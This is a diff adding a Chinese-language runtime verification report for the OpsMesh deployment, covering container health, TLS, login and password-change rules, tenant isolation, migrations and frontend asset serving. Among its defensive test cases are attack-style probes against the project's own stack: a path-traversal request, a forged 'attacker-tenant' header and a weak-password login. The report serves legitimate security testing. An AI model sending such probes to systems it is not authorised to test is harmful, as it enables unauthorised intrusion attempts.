+| 冒烟测试 | `deploy.sh` 内置冒烟全绿，含本轮新增的「Prometheus 采集目标全 UP」断言 |
+
+### 9.2 容器矩阵与端口真实性（P0-4 验收）
+
+17 个容器全部 Up（15 个 healthy；`grafana`、`otel-collector` 未定义 healthcheck，由宿主侧 HTTP 探活确认）：
+
+```
+aio-svc healthy   alert-svc healthy   auth-svc healthy   blackbox-exporter healthy
+config-svc healthy controlplane healthy device-svc healthy gpu-svc healthy
+log-svc healthy   loki healthy        mysql healthy      portal-svc healthy
+prometheus healthy redis healthy      task-svc healthy   grafana Up   otel-collector Up
+```
+
+**关键回归断言**：逐个容器核对 `HostConfig.PortBindings` 与 `NetworkSettings.Ports`，
+**没有任何容器「声明了宿主端口却未真实发布」**——这正是本轮定位的 `internal: true`
+静默丢弃缺陷的直接探针；缺陷态下会命中 13 个容器 / 15 个端口（见 §2 P0-4 对照实验）。
+
+### 9.3 控制面入口与鉴权链路（P0-1 / P0-2 验收）
+
+| 断言 | 结果 |
+|---|---|
+| `GET https://127.0.0.1:8080/healthz` | 200（TLS 生效） |
+| 明文 `http://…:8080/healthz` | HTTP 400（被 TLS 层拒绝，未进入业务处理）——**不是** 2xx |
+| 错误口令登录 | 401 |
+| 预置弱口令 `admin123` 登录 | **401**（P0-1 主断言） |
+| 正确初始口令登录 | 200 且 `mustChangePassword=true` + 一次性 `changePasswordToken` 齐备 |
+| 强制改密期间的会话凭证 | 响应中 `token` 字段为**空字符串**（`docs/operations.md` 承诺「改密前不签发正式 token」——实测吻合）；用该空 token 访问 `/api/v1/devices`、`/api/v1/tasks`、`/api/v1/alerts` 均返回 **401** |
+| `X-Tenant-ID` 伪造 | 401（越权头未被信任） |
+
+### 9.4 持久化落库（P0-7 验收）
+
+```
+库清单：opsmesh / opsmesh_device / opsmesh_task / opsmesh_alert / opsmesh_config / opsmesh_log
+opsmesh          54 张表（users/devices/tasks/audit_log/…）
+opsmesh_device    5 张表   opsmesh_task 2 张表
+opsmesh_alert     3 张表（alert_rules / alerts / silences）      ← 修复前：0 张表
+opsmesh_config    5 张表（config_entries / config_history / …）  ← 修复前：0 张表
+opsmesh_log       0 张表（log-svc 按设计走 loki 后端，非缺陷，登记以免误判）
+关键表可查：opsmesh.users=3 行；opsmesh_alert.alerts 可查；opsmesh_config.config_entries 可查
+```
+
+`opsmesh_alert` / `opsmesh_config` 从「零表」变为「建表成功且可查询」，即 P0-7 的端到端证据：
+这两个服务确实跑在 MySQL 上，而不是静默退回内存。
+
+### 9.5 监控真实性（假告警修复验收）
+
+- Prometheus 活动采集目标 **9 个，UP=9 / DOWN=0**，其中 mysql / redis 两个 job 经
+  `blackbox-exporter:9115/probe?module=tcp_connect` 探活：
+  `target=mysql%3A3306`、`target=redis%3A6379` 均为 `up`。
+- 告警接口：**firing=0 / pending=0**（修复前为 5 条常驻 critical 假告警）。
+
+### 9.6 负向验证（证明修复不是「恰好通过」）
+
+| 负向用例 | 期望 | 实测 |
+|---|---|---|
+| `ALERT_SVC_STORE_TYPE=sql` + 非法 DSN 启动 alert-svc | 拒绝启动 | **EXIT=1**，日志 `MySQL store 初始化失败，停止启动: open mysql: invalid DSN: …`（修复前：打一行日志后以内存存储继续服务） |
+| 把 `ensureParseTime` 还原为旧实现后跑 `dsn_test.go` | 测试变红 | 变红（证明测试有守护力，非恒真） |
+| 门禁负向：人为给带宿主端口的服务挂 `internal: true` 网络 | 门禁失败并点名 | 门禁 FAIL，点名 8 个服务（`validate-deploy-assets.sh` §4 不变式） |
+| 明文 HTTP 断言 | 只接受连接层拒绝或 TLS 层拒绝 | 断言显式接受 `000`/`400`，仅 1xx/2xx/3xx 判回归——避免把「Go TLS 服务器的 400 标准回应」误判为漏洞 |
+
+### 9.7 本轮未修的运行时观察（如实记录，非阻断）
+
+1. `GET https://<controlplane>:8080/metrics` **无需鉴权即返回 200**，暴露 `opsmesh_devices_total` /
+   `opsmesh_tasks_total` / `opsmesh_alerts_active` / `opsmesh_tickets_open` 等聚合计数（对应 §3 P1-5 面）。
+   建议：默认只绑 loopback 或加抓取白名单 + 限流。
+2. ~~登录在 `mustChangePassword=true` 时仍同时下发会话 token~~ —— **已实测排除**：`token` 字段为空串，
+   空 token 访问业务接口一律 401，与 `docs/operations.md` 的承诺一致（本报告初稿的此条为脚本误判：
+   脚本原先只匹配键名，未判值是否非空；断言已改为「非空 token 才判失败」）。
+3. ~~控制面工厂 `internal/controlplane/factory/server_factory.go` 对 M3/M5 子存储仍保留「构造失败退内存」的路径（§3 P1-8）。~~ —— **已修**：生产模式改为 fail-fast（见 §10.5）。
+
+---
+
+## 10. 真机全栈验证记录（2026-09-25 第二批：P0-3 / P0-5 / P0-6 / P1-8 收口验收）
+
+第二批修复的验收标准与第一批一致：**以真机把生产栈跑起来为准，不以静态结论收口**。
+
+### 10.1 被测对象与执行方式
+
+```
+交付物重建：docker compose -f docker-compose.prod.yml build controlplane   → EXIT=0
+            （含新增 node:22-alpine 构建阶段；npm ci + npm run build + test -f dist/index.html 全过）
+全栈重部署：bash scripts/deploy.sh up -y                                   → EXIT=0
+            17 容器全 Up/healthy；构建 15 个服务镜像后重新拉起；冒烟测试（含 gRPC TLS 握手）通过
+独立断言：  bash deploy/scripts/verify-runtime.sh                          → PASS=58  FAIL=0
+静态门禁：  bash deploy/scripts/validate-deploy-assets.sh                  → PASS=20  FAIL=0
+```
+
+### 10.2 企业版前端交付（P0-3 验收）
+
+镜像内已真实内置企业版前端（非占位），逐项实测：
+
+| 断言 | 实测 |
+|---|---|
+| `GET https://127.0.0.1:8080/enterprise/` | **200**，`Content-Type: text/html; charset=utf-8`，`Cache-Control: no-cache, no-store, must-revalidate`，CSP 含每请求 nonce |
+| 是否占位页 | 响应头**无** `X-OpsMesh-Enterprise-Bundle: placeholder`，body **无** `OPSMESH_ENTERPRISE_BUNDLE_PLACEHOLDER` → 真实构建产物 |
+| SPA 入口引用的资源 | `/enterprise/assets/js/index-DZhQRfLW.js` → **200** |
+| `assets` 缓存策略 | `Cache-Control: public, max-age=31536000, immutable` |
+| 预压缩协商（br） | `Content-Encoding: br` + `Vary: Accept-Encoding`，**9189B**（未压缩 37430B，压缩率 75%） |
+| 预压缩协商（gzip） | `Content-Encoding: gzip`，**10640B**（未压缩 37430B） |
+| SPA 深链回退 | `GET /enterprise/devices` **200**，与外壳响应体 **md5 逐字节一致**（`711f142a…`） |
+| 缺失分包 | `GET /enterprise/assets/__missing__.js` → **404**（未回退 HTML） |
+| 路径穿越 | `--path-as-is /enterprise/assets/../../healthz` → **307**（被 ServeMux 归一，未命中前端资源） |
+| 个人版引导页入口 | `GET /` 响应含 `href="/enterprise/"` 且无标记残留 |
+
+### 10.3 迁移安全（P0-5 验收）
+
+| 断言 | 实测 |
+|---|---|
+| 库内版本 vs 磁盘迁移文件 | `schema_migrations` 最大版本 **18** == 磁盘迁移文件 **18** 个 → 无漏跑 |
+| 防篡改基线 | 18 条已应用迁移的 `checksum` **均非空** |
+| 回滚脚本齐备 | `up=18 / down=18`（每个迁移随附 `.down.sql`） |
+| 真实 MySQL 集成测试 | 库内 13 个迁移集成测试 **13/13 通过**（`TestRunMigrations*` / `TestMigrationLock_ExcludesOtherSession` / `TestRunMigrations_ConcurrentStores` / `TestMigrationDownScripts_UnwindChain` 整链回滚等） |
+| 全套带 DSN 的分支 | `internal/store`(375s) / `internal/controlplane`(50s) / `internal/logstore` / `pkg/auth` 全绿 → EXIT=0 |
+
+### 10.4 多租户隔离（P0-6 验收）
+
+| 断言 | 实测 |
+|---|---|
+| `users.tenant_id` 列 | 存在；**历史行已回填**（空租户用户数 = 0） |
+| `tasks.tenant_id` 列 | 存在（领取侧 SQL 租户过滤可生效） |
+| 伪造租户头 → 设备列表 | 仅带 `X-Tenant-ID: attacker-tenant`：**401** |
+| 伪造租户头 → 用户管理 | 仅带 `X-Tenant-ID: attacker-tenant`：**401** |
+| JWT 携带租户 | `tenant_users_test.go:205` 断言登录签发的 JWT 经 `tenantFromBearer` 解出正确租户（随带 DSN 的 controlplane 全量测试通过） |
+
+### 10.5 P1-8（M3/M5 子存储失败不再静默降级）
+
+工厂在生产模式下对 M3/M5 子存储构造失败改为 fail-fast，与 `--production` / `StoreType=sql` 的既有阻断先例一致；`server_factory_test.go` 覆盖两分支。
+
+### 10.6 本轮自查抓到并修复的缺陷（说明断言不是橡皮图章）
+
+**gzip 预压缩旁路静默失效**：`negotiatedEncoding` 返回的编码名被直接当作旁路文件后缀拼接，
+gzip 分支去找 `x.js.gzip`（实际文件是 `x.js.gz`）→ 未命中 → 静默退回**未压缩原文**。
+服务端仍返回 200、无任何错误码，只表现为传输体积翻约 3.5 倍——正是「看起来通过、实际没生效」的典型。
+
+- **发现方式**：不是静态读代码，而是对同一 URL 做 `identity` / `br` / `gzip` 三种 `Accept-Encoding`
+  的**体积与 `Content-Encoding` 双比对**。
+- **修复**：`negotiatedEncoding` 改为返回 `(encoding, suffix, ok)` 两个独立值（头值 `gzip` ≠ 后缀 `gz`）。
+- **加固**：单元测试补 gzip 头值/后缀映射、已压缩路径不二次协商、旁路体必须小于原文；
+  运行时脚本对 `br` 与 `gzip` 逐编码断言「声明了对应编码 **且** 体积确实变小」。
+- **修复后实测**：`br 9189B / gzip 10640B < 未压缩 37430B`，两者均带正确 `Content-Encoding`。
+
+### 10.7 本轮清理（不留测试残留）
+
+- 为跑真实 MySQL 集成测试临时创建的 `migtest` 库用户**已删除**（`mysql.user` 中已无此用户），
+  临时库 `test_migration_*` 已全部 DROP（`information_schema.schemata` 中 0 条）。
+- 企业版前端构建产物落在 `internal/controlplane/embed/enterprise/`，由嵌套 `.gitignore`
+  白名单化（仅 `placeholder.html` + `.gitignore` 入库），`git status -uall` 该目录下**仅这两个文件**，
+  构建产物不可能被误提交。
+
